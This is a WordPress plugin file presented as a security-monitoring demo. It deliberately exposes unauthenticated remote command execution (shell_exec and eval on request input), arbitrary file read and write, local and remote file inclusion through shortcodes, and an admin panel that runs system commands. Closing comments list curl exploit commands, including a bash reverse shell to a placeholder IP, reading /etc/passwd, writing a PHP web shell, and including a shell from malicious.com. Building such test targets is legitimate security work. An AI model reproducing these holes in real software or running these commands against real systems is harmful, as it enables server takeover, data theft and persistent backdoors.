<?php
/**
 * Plugin Name: Portfolio Demo - Security Monitoring Test
 * Plugin URI: https://yourportfolio.com
 * Description: DEMONSTRATION ONLY - Contains intentional vulnerabilities for security monitoring demonstrations. FOR CONTROLLED TESTING ENVIRONMENTS ONLY.
 * Version: 1.0.0
 * Author: Your Name
 * License: GPL v2 or later
 * 
 * WARNING: This plugin contains intentional security vulnerabilities.
 * ONLY use in isolated testing environments.
 */

defined('ABSPATH') or die('Direct access not allowed.');

class PortfolioSecurityDemo {
    
    private $log_table = 'security_audit_logs';
    
    public function __construct() {
        add_action('init', array($this, 'init'));
        add_action('wp_ajax_nopriv_process_data', array($this, 'vulnerable_ajax_handler'));
        add_action('wp_ajax_process_data', array($this, 'vulnerable_ajax_handler'));
        add_action('wp_ajax_nopriv_file_operations', array($this, 'file_operations_handler'));
        add_action('wp_ajax_file_operations', array($this, 'file_operations_handler'));
        
        // Vulnerable shortcodes
        add_shortcode('execute', array($this, 'vulnerable_shortcode'));
        add_shortcode('include_file', array($this, 'include_file_shortcode'));
        
        // Vulnerable admin page
        add_action('admin_menu', array($this, 'add_admin_page'));
        
        register_activation_hook(__FILE__, array($this, 'create_log_table'));
    }
    
    /**
     * CREATE VULNERABLE LOG TABLE
     */
    public function create_log_table() {
        global $wpdb;
        $table_name = $wpdb->prefix . $this->log_table;
        
        $sql = "CREATE TABLE $table_name (
            id mediumint(9) NOT NULL AUTO_INCREMENT,
            timestamp datetime DEFAULT CURRENT_TIMESTAMP,
            ip_address varchar(45),
            user_agent text,
            request_uri text,
            payload text,
            vulnerability_type varchar(100),
            severity varchar(20),
            PRIMARY KEY (id)
        ) " . $wpdb->get_charset_collate();
        
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
    }
    
    /**
     * VULNERABILITY 1: UNSANITIZED EXECUTION
     * ACTUAL RCE VULNERABILITY
     */
    public function vulnerable_ajax_handler() {
        $this->log_request('rce_attempt', 'critical');
        
        // ACTUAL RCE VULNERABILITY - UNSAFE EXECUTION
        if (isset($_REQUEST['command'])) {
            $command = $_REQUEST['command'];
            
            // VULNERABLE: Direct command execution
            $output = shell_exec($command);
            
            wp_send_json_success(array(
                'output' => $output,
                'command' => $command
            ));
        }
        
        // VULNERABLE: eval() execution
        if (isset($_REQUEST['eval_code'])) {
            $code = $_REQUEST['eval_code'];
            
            // VULNERABLE: Direct eval
            eval($code);
            
            wp_send_json_success(array('status' => 'executed'));
        }
        
        wp_die();
    }
    
    /**
     * VULNERABILITY 2: FILE OPERATIONS
     */
    public function file_operations_handler() {
        $this->log_request('file_operation_attempt', 'high');
        
        // VULNERABLE: Arbitrary file read
        if (isset($_REQUEST['read_file'])) {
            $file_path = $_REQUEST['read_file'];
            
            // VULNERABLE: No path traversal protection
            $content = file_get_contents($file_path);
            
            wp_send_json_success(array(
                'content' => $content,
                'file' => $file_path
            ));
        }
        
        // VULNERABLE: Arbitrary file write
        if (isset($_REQUEST['write_file']) && isset($_REQUEST['content'])) {
            $file_path = $_REQUEST['write_file'];
            $content = $_REQUEST['content'];
            
            // VULNERABLE: No validation
            file_put_contents($file_path, $content);
            
            wp_send_json_success(array('status' => 'written'));
        }
        
        wp_die();
    }
    
    /**
     * VULNERABILITY 3: UNSAFE SHORTCODES
     */
    public function vulnerable_shortcode($atts) {
        $this->log_request('shortcode_rce', 'critical');
        
        $atts = shortcode_atts(array(
            'cmd' => 'whoami',
            'code' => ''
        ), $atts);
        
        // VULNERABLE: Shortcode command execution
        if (!empty($atts['cmd'])) {
            return shell_exec($atts['cmd']);
        }
        
        // VULNERABLE: Shortcode eval execution
        if (!empty($atts['code'])) {
            return eval($atts['code']);
        }
        
        return '';
    }
    
    /**
     * VULNERABILITY 4: FILE INCLUSION
     */
    public function include_file_shortcode($atts) {
        $this->log_request('lfi_attempt', 'high');
        
        $atts = shortcode_atts(array(
            'file' => '',
            'url' => ''
        ), $atts);
        
        // VULNERABLE: Local File Inclusion
        if (!empty($atts['file'])) {
            include($atts['file']);
        }
        
        // VULNERABLE: Remote File Inclusion
        if (!empty($atts['url'])) {
            include($atts['url']);
        }
        
        return '';
    }
    
    /**
     * VULNERABILITY 5: UNSAFE ADMIN PAGE
     */
    public function add_admin_page() {
        add_menu_page(
            'Security Demo',
            'Security Demo',
            'manage_options',
            'security-demo',
            array($this, 'admin_page_content')
        );
    }
    
    public function admin_page_content() {
        $this->log_request('admin_rce_attempt', 'critical');
        
        // VULNERABLE: Admin panel RCE
        if (isset($_POST['admin_command'])) {
            echo "<div class='notice notice-warning'><pre>";
            system($_POST['admin_command']);
            echo "</pre></div>";
        }
        
        if (isset($_POST['admin_eval'])) {
            echo "<div class='notice notice-warning'><pre>";
            eval($_POST['admin_eval']);
            echo "</pre></div>";
        }
        
        ?>
        <div class="wrap">
            <h1>Security Demo Panel</h1>
            <div class="warning" style="background: #ffcccc; padding: 10px; border: 2px solid red;">
                <strong>WARNING: This panel contains intentional vulnerabilities</strong>
            </div>
            
            <form method="post">
                <h3>Command Execution</h3>
                <input type="text" name="admin_command" style="width: 300px;" 
                       placeholder="Enter system command" value="<?php echo $_POST['admin_command'] ?? ''; ?>">
                <input type="submit" class="button button-primary" value="Execute">
            </form>
            
            <form method="post">
                <h3>PHP Code Execution</h3>
                <textarea name="admin_eval" style="width: 100%; height: 100px;" 
                          placeholder="Enter PHP code"><?php echo $_POST['admin_eval'] ?? ''; ?></textarea>
                <input type="submit" class="button button-primary" value="Execute PHP">
            </form>
        </div>
        <?php
    }
    
    /**
     * LOGGING FUNCTION - Connect this to your AWS monitoring
     */
    private function log_request($vulnerability_type, $severity = 'medium') {
        global $wpdb;
        
        $table_name = $wpdb->prefix . $this->log_table;
        
        $wpdb->insert($table_name, array(
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown',
            'payload' => json_encode($_REQUEST),
            'vulnerability_type' => $vulnerability_type,
            'severity' => $severity
        ));
        
        // TODO: Integrate with your AWS logging here
        // AWS CloudWatch, S3, or custom endpoint
        $this->send_to_aws_monitoring($vulnerability_type, $severity);
    }
    
    /**
     * AWS INTEGRATION POINT
     */
    private function send_to_aws_monitoring($vulnerability_type, $severity) {
        // Implement your AWS logging here
        $log_data = array(
            'timestamp' => date('c'),
            'vulnerability' => $vulnerability_type,
            'severity' => $severity,
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'request_uri' => $_SERVER['REQUEST_URI'] ?? 'unknown',
            'payload' => $_REQUEST
        );
        
        // Example: Send to AWS CloudWatch
        // file_put_contents('php://stderr', json_encode($log_data));
        
        // Example: Send to AWS S3
        // $this->log_to_s3($log_data);
        
        // Example: Send to AWS Lambda
        // $this->invoke_lambda($log_data);
    }
    
    public function init() {
        // Add admin warnings
        if (current_user_can('manage_options')) {
            add_action('admin_notices', array($this, 'admin_warning'));
        }
    }
    
    public function admin_warning() {
        ?>
        <div class="notice notice-error">
            <h3>🚨 PORTFOLIO SECURITY DEMO ACTIVE</h3>
            <p>This plugin contains <strong>INTENTIONAL VULNERABILITIES</strong> for security monitoring demonstrations.</p>
            <p><strong>REMOVE THIS PLUGIN AFTER TESTING!</strong></p>
        </div>
        <?php
    }
}

new PortfolioSecurityDemo();

/**
 * ADMIN TOOLS TO VIEW LOGS
 */
add_action('admin_menu', function() {
    add_submenu_page(
        'security-demo',
        'Security Logs',
        'View Logs',
        'manage_options',
        'security-demo-logs',
        'display_security_logs'
    );
});

function display_security_logs() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'security_audit_logs';
    
    $logs = $wpdb->get_results("SELECT * FROM $table_name ORDER BY timestamp DESC LIMIT 100");
    
    ?>
    <div class="wrap">
        <h1>Security Demo Logs</h1>
        <table class="wp-list-table widefat fixed striped">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>IP</th>
                    <th>Vulnerability</th>
                    <th>Severity</th>
                    <th>Payload</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($logs as $log): ?>
                <tr>
                    <td><?php echo $log->timestamp; ?></td>
                    <td><?php echo $log->ip_address; ?></td>
                    <td><strong><?php echo $log->vulnerability_type; ?></strong></td>
                    <td>
                        <span style="color: 
                            <?php echo $log->severity === 'critical' ? '#ff0000' : 
                                  ($log->severity === 'high' ? '#ff6600' : '#ffaa00'); ?>">
                            <?php echo strtoupper($log->severity); ?>
                        </span>
                    </td>
                    <td><code><?php echo substr($log->payload, 0, 100); ?></code></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <?php
}

/**  
 * # Basic command execution
* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&command=id"
* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&command=ls+-la+/etc"

* # PHP code execution
* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&eval_code=echo+shell_exec('whoami');"

* # Reverse shell (be careful!)
* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=process_data&command=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/PORT+0>%261'"
 *  
*/

/**
 * # Read arbitrary files
* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=file_operations&read_file=/etc/passwd"
* # Write files
* curl "http://yoursite.test/wp-admin/admin-ajax.php?action=file_operations&write_file=shell.php&content=<?php+system(\$_GET['cmd']);?>"
 */

/**
 * ShortCodes
 * [execute cmd="cat /etc/passwd"]
* [include_file file="/etc/passwd"]
* [include_file url="http://malicious.com/shell.txt"] 
 */

# Admin Panel Exploitation - /wp-admin/admin.php?page=security-demo